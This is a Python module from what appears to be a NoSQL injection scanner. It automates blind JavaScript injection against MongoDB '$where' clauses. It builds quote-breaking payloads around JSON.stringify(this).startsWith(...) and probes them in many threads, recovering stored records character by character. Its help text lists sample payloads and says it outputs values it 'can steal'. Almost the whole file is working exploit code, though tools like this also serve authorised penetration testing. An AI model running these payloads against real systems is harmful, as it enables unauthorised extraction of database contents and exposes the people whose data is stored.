import copy;
import difflib;
from util.output import verbose;
from util.output import success;
from util.output import failure;
from util.output import question;
from util.output import info;
from util.output import bold;

import threading;
from itertools import combinations;

class WhereBlindFunctionJSONStringifyInjection:
    def doc(self):
        bold("--Description--");
        print("Attempts to exploit javascript injection in a mongodb injection point to gather \
data via blind injection. Uses JSONStringify to get json objects in the form of strings.");
        print("");
        bold("--How it works--");
        print("The target must be using a '$where' check, with a javascript function parsed in string.");
        print("This module will use JSONStringify and startsWith to gather data. Payloads look like these:");
        print("'; if(JSON.stringify(this).slice(42,-1).startsWith('\"')){ return this; }; var dum = '");
        print("'; if(JSON.stringify(this).slice(42,-1).startsWith('\"u')){ return this; }; var dum = '");
        print("'; if(JSON.stringify(this).slice(42,-1).startsWith('\"us')){ return this; }; var dum = '");
        print("'; if(JSON.stringify(this).slice(42,-1).startsWith('\"use')){ return this; }; var dum = '");
        print("'; if(JSON.stringify(this).slice(42,-1).startsWith('\"user')){ return this; }; var dum = '");
        print("If a difference in webpage content, status or cookies is detected, \
this module will be able to extract values one letter at a time until a whole value is found.");
        bold("--Output--");
        print("This module will output any values it can steal via this method.");
        bold("--Extra Notes--");
        print(".slice(42,-01) is added if you want to omit ObjectID dumping. It will speed up the module \
significantly, since objectIDs are pretty long. You can still dump objectIDs by answering the console prompt.");
        print("Like whereAlwaysTrueFunctionInjection, the trailing and leading quotes are added and removed \
to test automatically for different injection points.");
        print("This module will fail to find some results in slow network conditions. If you only get 1 entry, \
it is recommended to rerun this module.");
        print("This may have some false positives if the target is also vulnerable to whereAlwaysTrueInjection.");
        print("Setting maxthreads beyond a certain limit does not increase the speed of this module. Feel free to \
set maxthreads as high as you want.");
        
    def getID(self):
        return 3;
        
    def getType(self):
        return "w";
    def __init__(self,url,param,scanner):
        self.url = url;
        self.param = param;
        self.scanner = scanner;
        self.options = {'q':"'","front":True,"back":True};
        #q, quote to use
        #front, if payload must start with quote
        #back, if payload must end with quote
        self.toGrabInFuture = [];
        self.entries = [];
        self.slice = ".slice(43,-1)";

    def vulnTest(self):
        failPayl = "\\";
        data = copy.deepcopy(self.scanner.data);
        data[self.param] = failPayl;
        self.scanner.textErrorBaseline = self.scanner.sendData(data).text;

        if self.scanner.textErrorBaseline != self.scanner.textBaseline:
            success("Basic check succeeded!");
        else:
            bold("Basic check failed. The rest of this module may not work.");
        
        for options in self.getAllOptions():
            verbose("Testing with: " + str(options));
            data = copy.deepcopy(self.scanner.data);
            data[self.param] = self.buildPayload(options,"; if(JSON.stringify(this).startsWith('{')){ return this; }; var dum = ");
            req = self.scanner.sendData(data);
            if req.text != self.scanner.textErrorBaseline:
                self.options = options;
                success("Error-based content check worked!");
                success("Payload built!");
                return True;
        return False;

    def getAllOptions(self):
        allOptions = [{'q':"'","front":True,"back":True},\
         {'q':"'","front":False,"back":True},\
         {'q':"'","front":True,"back":False},\
         {'q':"'","front":False,"back":False},\
         {'q':"\"","front":True,"back":True},\
         {'q':"\"","front":False,"back":True},\
         {'q':"\"","front":True,"back":False},\
         {'q':"\"","front":False,"back":False},\
         ];
        return allOptions;

    def buildPayload(self,options,payload):
        q = options["q"];
        reverseQuotes = '"';
        if q == '"':
            reverseQuotes = "'";
        front = options["front"];
        back = options["back"];
        #payload = payload.replace("'",q);
        #payload = payload.replace("\\\"",reverseQuotes);
        if front:
            payload = q + payload;
        
        payload += q;
        if back:
            payload += q;

        return payload;

    def grabData(self):
        bold("Be warned that this module may take some time to retrieve output.");
        if not question("Omit ObjectID from dump? (Faster)"):
            self.slice = "";
        self.grabEntries();
        if len(self.entries) == 0:
            failure("Nothing was retrieved with this module. Maybe false positive?");
            return None;
        return ["Found Entries:"] + self.entries;
        
    def grabEntries(self):
        self.toGrabInFuture = [];
        self.dumpEntry();
        
        threads = [];
        while len(self.toGrabInFuture) > 0:
            var = self.toGrabInFuture.pop();
            self.dumpEntry(var=var,retry=0);

        
    def dumpEntry(self,var=[],retry=0):
        charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\\ '\"!#$%&._()*+,-/:;<=>?@{|}[]^`~"
        i = 0;
        while True:
            i+= 1;
            if i > 500:
                bold("".join(var));
                if question("This entry seems abnormally long. Skip it?"):
                    break;
            prev = len(var);
            threads = []
            for c in charset:
                if len(threads) > self.scanner.maxthreads:
                    threads.pop().join();
                thread = threading.Thread(target = self.dumpEntryChar, args = (var,c));
                threads.append(thread);
                thread.start();

            for thread in threads:
                thread.join();
            
            if prev == len(var):
                break;
        entry = "".join(var).replace("\\\\",'\\').replace("\\\'","'").replace("\\\"",'"');
        if entry == "":
            return;
        bold("Found an entry: " + entry);
        self.entries.append(entry);

    def dumpEntryChar(self,var,c):
        try:
            speshul = ["\\","'",'"'];
            oldVar = copy.deepcopy(var);
            oldVarLength = len(var);
            if c in speshul:
                c = "\\" + c;
            condition = "".join(var) + c;
            
            payload = self.buildPayload(self.options,"; if(JSON.stringify(this)" + self.slice + ".startsWith('" + condition + "')){ return this; }; var dum = ");
            data = copy.deepcopy(self.scanner.data);
            data[self.param] = payload;
            req = self.scanner.sendData(data);
            check = self.scanner.check(req);
            oldVar.append(c);
            if check != "none":
                if len(var) == oldVarLength:
                    var.append(c);
                    #print(payload);
                    verbose("".join(var) + "...");
                elif oldVar not in self.toGrabInFuture:
                    self.toGrabInFuture.append(oldVar);
                    verbose("Found alternative, will test later: "+"".join(oldVar));
                    #info(self.fromVarToString(oldVar) + "."*(length-len(oldVar)));
        except Exception as e:
            failure(str(e));
            self.dumpEntryChar(var,c);